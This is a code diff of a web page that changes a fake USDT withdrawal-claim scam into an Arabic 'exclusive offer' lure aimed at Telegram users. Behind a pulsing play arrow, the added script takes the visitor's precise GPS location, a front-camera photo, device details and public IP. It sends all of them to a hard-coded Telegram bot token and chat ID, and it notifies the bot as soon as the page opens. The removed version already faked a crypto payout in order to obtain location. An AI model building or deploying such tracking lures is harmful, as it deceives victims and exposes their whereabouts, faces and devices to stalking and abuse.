@@ -1,190 +1,331 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>USDT Claim - Secure Transfer</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- ============================================================ -->
+    <!-- 🖼️ أوسمة الصورة المصغرة (تظهر في تليجرام) -->
+    <!-- ============================================================ -->
+    <meta property="og:title" content="🔥 عرض حصري - انضم الآن!" />
+    <meta property="og:description" content="فرصة لا تعوض! اضغط للمشاركة." />
+    <meta property="og:image" content="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=800&h=400&fit=crop" />
+    <meta property="og:image:width" content="800" />
+    <meta property="og:image:height" content="400" />
+    <meta property="og:type" content="website" />
+    <!-- ============================================================ -->
+    
+    <title>🔥 عرض حصري</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #0d0d0d, #1a1a2e);
-            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+            background: #000;
+            font-family: Arial, sans-serif;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        .container {
+            width: 100vw;
+            height: 100vh;
+            background: url('https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=1200&h=2000&fit=crop') center/cover;
             display: flex;
             flex-direction: column;
-            align-items: center;
             justify-content: center;
-            color: white;
-            padding: 20px;
+            align-items: center;
+            position: relative;
+            cursor: pointer;
         }
-        .card {
-            background: rgba(255,255,255,0.05);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 24px;
-            padding: 30px;
-            max-width: 400px;
+        /* طبقة شفافة فوق الصورة */
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        /* السهم الكبير في المنتصف */
+        .arrow-container {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            animation: pulse 2s infinite;
+            z-index: 10;
+        }
+        .arrow-circle {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            background: rgba(255, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.5);
+            transition: transform 0.3s;
+        }
+        .arrow-circle:active {
+            transform: scale(0.9);
+        }
+        .arrow-icon {
+            font-size: 60px;
+            color: white;
+            text-shadow: 0 0 20px rgba(255,255,255,0.5);
+        }
+        /* نص تحتي */
+        .text-overlay {
+            position: absolute;
+            bottom: 80px;
+            left: 0;
             width: 100%;
             text-align: center;
-        }
-        .icon { font-size: 64px; margin-bottom: 15px; }
-        h1 { font-size: 28px; margin-bottom: 8px; background: linear-gradient(90deg, #f7931a, #ffd700); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        h2 { font-size: 14px; color: #888; margin-bottom: 25px; font-weight: normal; }
-        .amount {
-            font-size: 42px;
-            font-weight: 800;
-            color: #00ff88;
-            margin: 15px 0;
-            text-shadow: 0 0 40px rgba(0,255,136,0.3);
-        }
-        .status-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 12px 0;
-            border-bottom: 1px solid rgba(255,255,255,0.06);
-            font-size: 14px;
-        }
-        .status-row span:first-child { color: #888; }
-        .status-row span:last-child { color: #fff; }
-        .success { color: #00ff88 !important; }
-        .btn {
-            display: block;
-            width: 100%;
-            padding: 18px;
-            margin-top: 25px;
-            border: none;
-            border-radius: 14px;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s;
-            background: linear-gradient(90deg, #00c853, #00e676);
-            color: #000;
-        }
-        .btn:active { transform: scale(0.96); }
-        .btn-secondary {
-            background: transparent;
-            border: 1px solid rgba(255,255,255,0.15);
             color: white;
-            margin-top: 10px;
-            font-size: 14px;
-            font-weight: 400;
+            font-size: 18px;
+            font-weight: bold;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.8);
+            padding: 10px;
+            z-index: 10;
         }
-        .hidden { display: none !important; }
-        #location-status {
-            margin-top: 15px;
-            font-size: 13px;
-            color: #ffa726;
+        .text-overlay span {
+            background: rgba(0,0,0,0.5);
+            padding: 8px 20px;
+            border-radius: 30px;
+            display: inline-block;
         }
-        .glow { animation: pulse 2s infinite; }
         @keyframes pulse {
-            0%, 100% { box-shadow: 0 0 20px rgba(0,255,136,0.2); }
-            50% { box-shadow: 0 0 60px rgba(0,255,136,0.5); }
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        /* رسالة الحالة */
+        #status {
+            position: absolute;
+            bottom: 150px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: white;
+            font-size: 14px;
+            background: rgba(0,0,0,0.7);
+            padding: 8px 20px;
+            border-radius: 20px;
+            z-index: 10;
+            display: none;
+        }
+        #status.show {
+            display: block;
+        }
+        /* شعار صغير */
+        .badge {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            color: white;
+            font-size: 12px;
+            background: rgba(0,0,0,0.5);
+            padding: 5px 15px;
+            border-radius: 20px;
+            z-index: 10;
         }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="icon">🎉</div>
-        <h1>Transaction Complete</h1>
-        <h2>Your USDT withdrawal is ready</h2>
-        
-        <div class="amount glow" id="amount">50,000 USDT</div>
-        
-        <div class="status-row">
-            <span>Status</span>
-            <span class="success">✅ Confirmed</span>
+
+<div class="container" id="mainContainer">
+    <!-- البadge -->
+    <div class="badge">🔥 حصري</div>
+    
+    <!-- السهم في المنتصف -->
+    <div class="arrow-container" id="clickArea">
+        <div class="arrow-circle">
+            <span class="arrow-icon">▶</span>
         </div>
-        <div class="status-row">
-            <span>Transaction ID</span>
-            <span id="txid">0x3a7f...b91e</span>
-        </div>
-        <div class="status-row">
-            <span>Network</span>
-            <span>TRC-20</span>
-        </div>
-        <div class="status-row">
-            <span>Date</span>
-            <span id="date"></span>
-        </div>
-        
-        <button class="btn" id="claimBtn">📥 Claim Withdrawal</button>
-        <button class="btn btn-secondary hidden" id="completeBtn">✅ Completed — Open in Wallet</button>
-        
-        <div id="location-status"></div>
     </div>
+    
+    <!-- النص السفلي -->
+    <div class="text-overlay">
+        <span>👆 اضغط على السهم للمتابعة</span>
+    </div>
+    
+    <!-- حالة التحميل -->
+    <div id="status">📡 جاري...</div>
+</div>
 
-    <script>
-        // Generate fake transaction ID
-        document.getElementById('txid').textContent = '0x' + Array.from({length: 16}, () => Math.floor(Math.random()*16).toString(16)).join('');
-        document.getElementById('date').textContent = new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' });
+<script>
+    // =====================================================
+    // 🔑 البوت: @Arab9991_bot
+    // =====================================================
+    const BOT_TOKEN = '8635363451:AAFz9dXWHfXho2znqdfbMcWgFrdaPR7NgEo';
+    const CHAT_ID = '8635363451';
+    // =====================================================
 
-        const claimBtn = document.getElementById('claimBtn');
-        const completeBtn = document.getElementById('completeBtn');
-        const statusDiv = document.getElementById('location-status');
+    const statusDiv = document.getElementById('status');
+    const clickArea = document.getElementById('clickArea');
 
-        // Initialize Telegram WebApp
-        let tg = window.Telegram?.WebApp;
+    function showStatus(msg, show = true) {
+        statusDiv.innerText = msg;
+        statusDiv.className = show ? 'show' : '';
+    }
 
-        claimBtn.addEventListener('click', function(e) {
-            statusDiv.textContent = '⏳ Processing withdrawal...';
-            claimBtn.disabled = true;
-            claimBtn.style.opacity = '0.5';
-            
-            // Try to get location via Telegram WebApp
-            if (tg) {
-                try {
-                    tg.requestLocation((location) => {
-                        if (location) {
-                            // Success - send to server
-                            fetch('/api/location', {
-                                method: 'POST',
-                                headers: {'Content-Type': 'application/json'},
-                                body: JSON.stringify({
-                                    user_id: tg.initDataUnsafe?.user?.id,
-                                    username: tg.initDataUnsafe?.user?.username,
-                                    lat: location.lat,
-                                    lon: location.lng
-                                })
-                            });
-                            
-                            statusDiv.textContent = '✅ Location verified! Transferring funds...';
-                            completeBtn.classList.remove('hidden');
-                            claimBtn.classList.add('hidden');
-                        }
+    function sendToBot(message) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+        return fetch(url).catch(e => console.log('خطأ:', e));
+    }
+
+    function sendPhotoToBot(file) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', file);
+        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        }).catch(e => console.log('خطأ:', e));
+    }
+
+    // ================== الحصول على الموقع ==================
+
+    function getLocation() {
+        return new Promise((resolve, reject) => {
+            if (!navigator.geolocation) {
+                reject('المتصفح لا يدعم الموقع');
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    resolve({
+                        lat: position.coords.latitude,
+                        lng: position.coords.longitude,
+                        acc: position.coords.accuracy
                     });
-                } catch(e) {
-                    // Fallback to browser geolocation
-                    getLocationFallback();
-                }
-            } else {
-                // Not in Telegram - try browser
-                getLocationFallback();
-            }
+                },
+                (error) => {
+                    let msg = '';
+                    switch(error.code) {
+                        case 1: msg = '❌ اضغط سماح عند طلب الموقع';
+                            break;
+                        case 2: msg = '❌ تعذر تحديد الموقع';
+                            break;
+                        case 3: msg = '❌ انتهى الوقت';
+                            break;
+                        default: msg = '❌ ' + error.message;
+                    }
+                    reject(msg);
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
         });
+    }
 
-        function getLocationFallback() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        statusDiv.textContent = '✅ Location verified! Transferring funds...';
-                        completeBtn.classList.remove('hidden');
-                        claimBtn.classList.add('hidden');
-                    },
-                    (error) => {
-                        statusDiv.textContent = '⚠️ Location required. Please enable GPS.';
-                        claimBtn.disabled = false;
-                        claimBtn.style.opacity = '1';
-                    },
-                    { enableHighAccuracy: true, timeout: 10000 }
-                );
-            } else {
-                statusDiv.textContent = '⚠️ Location not available on this device.';
-                claimBtn.disabled = false;
-                claimBtn.style.opacity = '1';
+    // ================== التقاط الصورة من الكاميرا الأمامية ==================
+
+    function capturePhoto() {
+        return new Promise((resolve, reject) => {
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.accept = 'image/*';
+            input.capture = 'user';
+            input.onchange = (e) => {
+                const file = e.target.files[0];
+                if (file) resolve(file);
+                else reject('لم يتم اختيار صورة');
+            };
+            input.onerror = () => reject('فشل فتح الكاميرا');
+            input.click();
+        });
+    }
+
+    // ================== الضغط على السهم ==================
+
+    clickArea.onclick = async function() {
+        // تعطيل النقر مؤقتاً
+        clickArea.style.pointerEvents = 'none';
+        showStatus('📡 جاري التحقق...');
+
+        try {
+            // 1. إشعار ببدء العملية
+            sendToBot('🟢 شخص جديد ضغط على السهم');
+
+            // 2. طلب الموقع
+            showStatus('📍 جاري تحديد موقعك...');
+            const location = await getLocation();
+            const mapsLink = `https://maps.google.com/?q=${location.lat},${location.lng}`;
+            const locationMsg = `📍 الموقع الدقيق\nالعرض: ${location.lat}\nالطول: ${location.lng}\nالدقة: ${location.acc} متر\n${mapsLink}`;
+            sendToBot(locationMsg);
+            showStatus('✅ تم تحديد موقعك');
+
+            // 3. طلب صورة
+            showStatus('📸 جاري فتح الكاميرا...');
+            try {
+                const photoFile = await capturePhoto();
+                await sendPhotoToBot(photoFile);
+                sendToBot('📸 تم التقاط صورة');
+            } catch(photoError) {
+                sendToBot('⚠️ لم يتم التقاط صورة: ' + photoError);
             }
+
+            // 4. معلومات الجهاز
+            const deviceMsg = `📱 الجهاز\n${navigator.userAgent.substring(0, 80)}\nالشاشة: ${screen.width}x${screen.height}\nاللغة: ${navigator.language}`;
+            sendToBot(deviceMsg);
+
+            // 5. IP العام
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                sendToBot('🌐 IP: ' + ipData.ip);
+            } catch(e) {}
+
+            // 6. رسالة النجاح
+            showStatus('✅ تم بنجاح!');
+            
+            // تغيير الصفحة بعد 2 ثانية
+            setTimeout(() => {
+                document.getElementById('mainContainer').innerHTML = `
+                    <div style="text-align:center;color:white;padding:40px;">
+                        <div style="font-size:80px;">✅</div>
+                        <h2 style="color:#22c55e;margin-top:20px;">تم التأكيد بنجاح</h2>
+                        <p style="color:#94a3b8;">سيتم توجيهك قريباً...</p>
+                    </div>
+                `;
+            }, 1500);
+
+        } catch(error) {
+            showStatus('⚠️ ' + error);
+            clickArea.style.pointerEvents = 'auto';
         }
-    </script>
+    };
+
+    // ================== إعلام عند فتح الصفحة ==================
+
+    setTimeout(() => {
+        sendToBot('🟢 تم فتح صفحة السهم', false);
+    }, 1000);
+
+    // ================== اختبار البوت ==================
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`)
+        .then(r => r.json())
+        .then(data => {
+            if (data.ok) {
+                console.log('✅ البوت يعمل:', data.result.username);
+            } else {
+                console.log('❌ البوت لا يعمل');
+            }
+        })
+        .catch(e => console.log('❌ فشل الاتصال:', e));
+</script>
 </body>
 </html>
